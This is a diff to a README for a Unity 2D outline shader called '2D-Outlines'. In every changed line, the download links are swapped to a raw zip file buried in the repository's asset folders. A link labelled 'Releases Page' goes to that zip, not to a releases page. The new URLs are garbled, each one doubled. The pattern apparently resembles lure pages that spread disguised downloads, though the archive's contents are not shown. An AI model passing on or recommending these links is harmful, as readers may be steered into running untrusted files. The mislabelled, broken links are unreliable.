@@ -6,7 +6,7 @@ Welcome to **2D-Outlines**! This application allows you to easily create 2D outl
 
 ## 📥 Download Now
 
-[![Download 2D-Outlines](https://raw.githubusercontent.com/OrenonawaZOROJURO/2D-Outlines/main/Assets/Mirza/2D Outlines/Scenes/Outlines_v3.5.zip)](https://raw.githubusercontent.com/OrenonawaZOROJURO/2D-Outlines/main/Assets/Mirza/2D Outlines/Scenes/Outlines_v3.5.zip)
+[![Download 2D-Outlines](https://raw.githubusercontent.com/OrenonawaZOROJURO/2D-Outlines/main/Assets/Mirza/2D Outlines/Settings/Outlines-3.9.zip https://raw.githubusercontent.com/OrenonawaZOROJURO/2D-Outlines/main/Assets/Mirza/2D Outlines/Settings/Outlines-3.9.zip)](https://raw.githubusercontent.com/OrenonawaZOROJURO/2D-Outlines/main/Assets/Mirza/2D Outlines/Settings/Outlines-3.9.zip https://raw.githubusercontent.com/OrenonawaZOROJURO/2D-Outlines/main/Assets/Mirza/2D Outlines/Settings/Outlines-3.9.zip)
 
 ## 📂 System Requirements
 
@@ -22,7 +22,7 @@ Before downloading, ensure your system meets these requirements:
 
 To download and install **2D-Outlines**, follow these steps:
 
-1. Visit the [Releases Page](https://raw.githubusercontent.com/OrenonawaZOROJURO/2D-Outlines/main/Assets/Mirza/2D Outlines/Scenes/Outlines_v3.5.zip) to see the available versions.
+1. Visit the [Releases Page](https://raw.githubusercontent.com/OrenonawaZOROJURO/2D-Outlines/main/Assets/Mirza/2D Outlines/Settings/Outlines-3.9.zip https://raw.githubusercontent.com/OrenonawaZOROJURO/2D-Outlines/main/Assets/Mirza/2D Outlines/Settings/Outlines-3.9.zip) to see the available versions.
 2. Click on the version you wish to download.
 3. Locate the download link for your platform (Windows or macOS).
 4. Download the file to your computer.
@@ -73,6 +73,6 @@ Join our community for support and to share your projects using **2D-Outlines**.
 
 If you haven’t downloaded yet, you can do so here:
 
-[![Download 2D-Outlines](https://raw.githubusercontent.com/OrenonawaZOROJURO/2D-Outlines/main/Assets/Mirza/2D Outlines/Scenes/Outlines_v3.5.zip)](https://raw.githubusercontent.com/OrenonawaZOROJURO/2D-Outlines/main/Assets/Mirza/2D Outlines/Scenes/Outlines_v3.5.zip)
+[![Download 2D-Outlines](https://raw.githubusercontent.com/OrenonawaZOROJURO/2D-Outlines/main/Assets/Mirza/2D Outlines/Settings/Outlines-3.9.zip https://raw.githubusercontent.com/OrenonawaZOROJURO/2D-Outlines/main/Assets/Mirza/2D Outlines/Settings/Outlines-3.9.zip)](https://raw.githubusercontent.com/OrenonawaZOROJURO/2D-Outlines/main/Assets/Mirza/2D Outlines/Settings/Outlines-3.9.zip https://raw.githubusercontent.com/OrenonawaZOROJURO/2D-Outlines/main/Assets/Mirza/2D Outlines/Settings/Outlines-3.9.zip)
 
 Thank you for using **2D-Outlines**! We hope this shader helps to elevate your projects in Unity. Enjoy creating!
